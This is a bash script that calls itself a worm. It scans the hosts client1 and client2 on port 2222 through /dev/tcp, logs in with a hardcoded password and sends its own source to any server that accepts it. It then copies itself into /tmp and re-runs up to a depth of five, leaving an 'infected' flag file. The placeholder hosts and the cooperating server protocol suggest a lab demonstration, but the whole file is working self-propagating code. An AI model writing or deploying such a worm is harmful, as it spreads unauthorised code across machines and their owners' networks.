#!/bin/bash
set -e

MAX_DEPTH=5
CURRENT_DEPTH=${1:-1}
PASSWORD="letmein"

touch /tmp/infected.flag
echo "[*] Worm running at depth $CURRENT_DEPTH on $(hostname)"

targets=(client1 client2)

for target in "${targets[@]}"; do
  echo "[*] Scanning $target:2222..."
  if timeout 3 bash -c "</dev/tcp/$target/2222" 2>/dev/null; then
    echo "[*] $target is up. Attempting infection..."

    {
      exec 3<>/dev/tcp/$target/2222

      # Step 1: Read password prompt
      IFS= read -r line <&3
      echo "[*] Server prompt: $line"

      # Step 2: Send password
      echo -e "$PASSWORD" >&3
      echo "[*] Password sent to $target, waiting for server reply..."

      # Step 3: Read server response (should be "Send your script:" or "Already infected" or "Access denied")
      IFS= read -r response <&3
      echo "[*] Server response: $response"

      if [[ "$response" == *"Send your script:"* ]]; then
        echo "[*] Server requested script. Sending payload..."
        cat "$0" >&3
        echo "[*] Payload sent to $target"

        # Step 4: Read final confirmation from server
        IFS= read -r final <&3
        echo "[*] Server final reply: $final"

      elif [[ "$response" == *"Already infected"* ]]; then
        echo "[!] $target already infected"
      else
        echo "[!] Infection failed for $target. Server said: $response"
      fi

      exec 3<&-
      exec 3>&-
    } || echo "[!] Infection failed for $target"
  else
    echo "[!] $target not reachable"
  fi
done

if [ "$CURRENT_DEPTH" -lt "$MAX_DEPTH" ]; then
  NEXT=$((CURRENT_DEPTH + 1))
  new_file="/tmp/copy_${CURRENT_DEPTH}_$(date +%s).sh"
  cp "$0" "$new_file"
  chmod +x "$new_file"
  echo "[*] Self-replicating to $new_file"
  "$new_file" "$NEXT" &
else
  echo "[*] Max depth reached"
fi

